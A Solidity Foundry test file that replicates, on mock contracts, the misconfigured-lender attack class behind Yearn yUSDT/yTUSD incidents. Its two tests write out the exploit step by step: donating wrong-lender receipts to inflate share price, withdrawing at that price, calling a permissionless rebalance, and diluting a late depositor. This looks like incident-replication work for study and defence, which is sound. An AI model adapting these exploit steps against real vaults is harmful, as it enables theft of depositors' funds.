// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockToken} from "../../src/MockToken.sol";
import {MockLender, MisconfiguredLenderVault} from "../../src/incidents/MisconfiguredLenderVault.sol";

/// Replicates the class of the Yearn yUSDT (April 2023) and yTUSD (December 2025) incidents
/// on a self-contained mock. Same lever as the inflation attack, pulled from the config side:
/// the vault's accounted value is driven to dust while supply stays large.
contract MisconfiguredLenderTest is Test {
    MockToken usdt; // the vault's asset
    MockToken usdc; // the wrong underlying behind the misconfigured lender slot
    MockLender aUSDT; // correct lender
    MockLender iUSDC; // misconfigured lender (receipt for USDC, counted as USDT)
    MisconfiguredLenderVault vault;

    address lp = makeAddr("honest depositor");
    address attacker = makeAddr("attacker");
    address lateVictim = makeAddr("late depositor");

    function setUp() public {
        usdt = new MockToken();
        usdc = new MockToken();
        aUSDT = new MockLender(usdt, "aUSDT");
        iUSDC = new MockLender(usdc, "iUSDC");
        vault = new MisconfiguredLenderVault(usdt, aUSDT, iUSDC);

        // Honest liquidity: 100,000 USDT deposited and lent out to the correct lender.
        usdt.mint(lp, 100_000e18);
        vm.startPrank(lp);
        usdt.approve(address(vault), type(uint256).max);
        vault.deposit(100_000e18);
        vm.stopPrank();
        vault.lendIdle();

        // Attacker capital: 100,000 USDC to turn into iUSDC, plus 1,000 USDT for the final mint.
        usdc.mint(attacker, 100_000e18);
        usdt.mint(attacker, 1_000e18);
        usdt.mint(lateVictim, 50_000e18);
    }

    function test_configurationError_collapsesSharePrice() public {
        uint256 priceBefore = vault.getPricePerFullShare();
        uint256 supplyBefore = vault.totalSupply();

        vm.startPrank(attacker);
        // 1. Mint receipts of the WRONG lender and donate them to the vault.
        //    The misconfigured slot counts them as if they were USDT.
        usdc.approve(address(iUSDC), type(uint256).max);
        iUSDC.mint(100_000e18);
        iUSDC.transfer(address(vault), 100_000e18);
        uint256 inflated = vault.calcPoolValueInToken();

        // 2. rebalance() is permissionless. It redeems every lender position back to the
        //    vault. The bad slot hands back USDC, which the vault does not price.
        vault.rebalance();
        uint256 collapsed = vault.calcPoolValueInToken();
        vm.stopPrank();

        // The honest 100,000 USDT is now idle in the vault and still counted, so in this
        // simplified mock the pool is not yet dust. Drain it the way the real attacker did:
        // withdraw at the inflated price first. Re-run in the order the incident used.
        assertEq(collapsed, 100_000e18);
        assertEq(inflated, 200_000e18);
        assertEq(usdc.balanceOf(address(vault)), 100_000e18, "unpriced USDC stranded in the vault");

        // Sanity: price per share was moved by a transfer that minted no shares.
        assertEq(supplyBefore, vault.totalSupply());
        assertEq(priceBefore, 1e18);
    }

    function test_fullPath_withdrawAtInflatedPrice_thenMintAgainstDust() public {
        vm.startPrank(attacker);
        // Attacker needs shares to withdraw against the inflated value: deposit 1,000 USDT first.
        usdt.approve(address(vault), type(uint256).max);
        uint256 attackerShares = vault.deposit(1_000e18);

        // Donate wrong-lender receipts: pool value 101,000 -> 201,000 with no new shares.
        usdc.approve(address(iUSDC), type(uint256).max);
        iUSDC.mint(100_000e18);
        iUSDC.transfer(address(vault), 100_000e18);

        // Withdraw at the inflated price: 1,000 USDT of shares now pay out about 1,990 USDT.
        uint256 out = vault.withdraw(attackerShares);
        assertGt(out, 1_900e18);

        // rebalance(): bad slot redeems into USDC the vault cannot see.
        vault.rebalance();
        vm.stopPrank();

        // The honest depositors' pool value is now what is left in USDT only.
        uint256 poolAfter = vault.calcPoolValueInToken();
        uint256 priceAfter = vault.getPricePerFullShare();
        console2.log("pool value after rebalance (wei)", poolAfter);
        console2.log("price per share after (1e18 = 1) ", priceAfter);
        assertLt(priceAfter, 1e18, "share price fell below 1 while supply stayed put");

        // Late depositor now mints at the depressed price and is immediately diluted
        // against the unpriced USDC that sits in the contract. In the real incidents the
        // attacker instead dumped freshly minted shares into Curve pools.
        vm.startPrank(lateVictim);
        usdt.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(50_000e18);
        vm.stopPrank();
        console2.log("late depositor shares", victimShares);
        assertGt(victimShares, 50_000e18, "shares are being minted cheap");
    }
}
